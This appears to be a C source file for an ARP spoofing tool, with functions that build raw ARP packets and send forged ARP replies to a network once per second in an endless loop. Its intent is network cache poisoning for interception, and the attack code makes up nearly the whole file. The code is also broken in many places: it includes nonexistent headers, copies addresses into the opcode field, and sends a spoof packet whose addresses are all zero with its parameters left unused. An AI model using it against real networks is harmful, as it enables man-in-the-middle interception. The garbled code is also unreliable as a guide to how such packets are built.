#include <arp.h>
#include <signal.h>
#include <netinet/if_ether.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/ioctl.h>

#include <sys/sockio.h>

#include <hosts.h>
#include <net/if_dl.h>


int arp_spoof(char *interface, char* sender_ip, char* target_ip){
    struct in_addr target_ip_hdr;
    int sock;
    struct ifreq ifr;

    if (inet_aton(target_ip,&target_ip_hdr) == 0){
        perror("inet_aton");
        raise(EXIT_FAILURE);
    }

    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

    if (sock < 0){
        perror("socket");
        raise(EXIT_FAILURE);
    }
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        exit(EXIT_FAILURE);
    }
      struct ethhdr eth_header;
    memcpy(eth_header.h_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", ETH_ALEN); // Broadcast MAC address
    // memcpy(eth_header.h_source, ifr.ifr_hwaddr.sa_data, ETH_ALEN);     // Source MAC address
    eth_header.h_proto = htons(ETH_P_ARP);                              // Protocol type: ARP

    // Fill in ARP header
    struct arphdr arp_header;
    arp_header.ar_hrd = htons(ARPHRD_ETHER);       // Hardware type: Ethernet
    arp_header.ar_pro = htons(ETH_P_IP);           // Protocol type: IPv4
    arp_header.ar_hln = ETH_ALEN;                  // Hardware address length: 6 bytes
    arp_header.ar_pln = 4;                         // Protocol address length: 4 bytes
    arp_header.ar_op = htons(ARPOP_REQUEST);        // Operation code: ARP request
    memcpy(arp_header.ar_op, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4); // Sender IP address
    memcpy(arp_header.ar_op, &target_ip, 4);       // Target IP address

    // Construct packet
    char packet[BUF_SIZE];
    memcpy(packet, &eth_header, sizeof(struct ethhdr));
    memcpy(packet + sizeof(struct ethhdr), &arp_header, sizeof(struct arphdr));

    // Send packet
    struct sockaddr addr;
    memset(&addr, 0, sizeof(struct sockaddr));
    strncpy(addr.sa_data, interface, sizeof(addr.sa_data));
    if (sendto(sock, packet, BUF_SIZE, 0, &addr, sizeof(struct sockaddr)) < 0) {
        perror("sendto");
        close(sock);
        exit(EXIT_FAILURE);
    }

    printf("ARP request sent to %s\n", target_ip);

    close(sock);
    return 0;
}

void getAllInterfaces(){
    int sock;
    struct ifreq ifr;
    struct arpreq arpreq;
    struct sockaddr_in *sin;
    struct ether_addr *eth;
    char buffer[NORMAL_BUFFER_SIZE];
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
    }

    struct ifconf ifc;
    // List devices
    ifc.ifc_len = sizeof(buffer);
    if (ioctl(sock, SIOCGIFCONF, &ifc) < 0) {
        perror("ioctl");
        close(sock);
    }

        sin = (struct sockaddr_in *)&ifr.ifr_addr;
        printf("Interface: %s, \n IP Address: %s\n", ifr.ifr_name, inet_ntoa(sin->sin_addr));


        // Get MAC address
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
            perror("ioctl");
            close(sock);
        }
        eth = (struct ether_addr *)ifr.ifr_name;
        printf("Interface: %s, MAC Address: %02x:%02x:%02x:%02x:%02x:%02x\n",
               ifr.ifr_name, eth->ether_addr_octet[0], eth->ether_addr_octet[1],
               eth->ether_addr_octet[2], eth->ether_addr_octet[3],
               eth->ether_addr_octet[4], eth->ether_addr_octet[5]);
    close(sock);
            
    }





void send_arp_spoofing(const char* iface, const char* target_ip, const char* spoof_ip) {
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("Error getting interface index");
        close(sockfd);
        exit(1);
    }

    struct sockaddr_ll socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);

    unsigned char packet[42] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination MAC: Broadcast
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC: We don't care
                                 0x08, 0x06,                          // EtherType: ARP (0x0806)
                                 0x00, 0x01,                          // Hardware type (Ethernet = 1)
                                 0x08, 0x00,                          // Protocol type (IPv4 = 0x0800)
                                 0x06, 0x04,                          // Hardware size (Ethernet = 6, IPv4 = 4)
                                 0x00, 0x02,                          // ARP opcode (Reply = 2)
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Sender MAC: We don't care
                                 0x00, 0x00, 0x00, 0x00,              // Sender IP: We don't care
                                 0x00, 0x00, 0x00, 0x00,              // Target MAC: We don't care
                                 0x00, 0x00, 0x00, 0x00};             // Target IP: We don't care

    struct arphdr* arp_header = (struct arphdr*)(packet + 14);
    arp_header->ar_hrd = htons(ARPHRD_ETHER);
    arp_header->ar_pro = htons(ETH_P_IP);
    arp_header->ar_hln = 6;
    arp_header->ar_pln = 4;
    arp_header->ar_op = htons(ARPOP_REPLY);

    struct sockaddr* sa = (struct sockaddr*)&socket_address;
    if (bind(sockfd, sa, sizeof(struct sockaddr_ll)) < 0) {
        perror("Bind failed");
        close(sockfd);
        exit(1);
    }

    struct sockaddr_ll dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sll_family = AF_PACKET;
    dest_addr.sll_protocol = htons(ETH_P_ARP);
    memcpy(dest_addr.sll_addr, packet, 6);

    while (1) {
        if (sendto(sockfd, packet, 42, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("Sendto failed");
            close(sockfd);
            exit(1);
        }
        printf("ARP Spoofing sent\n");
        sleep(1);
    }

    close(sockfd);
}
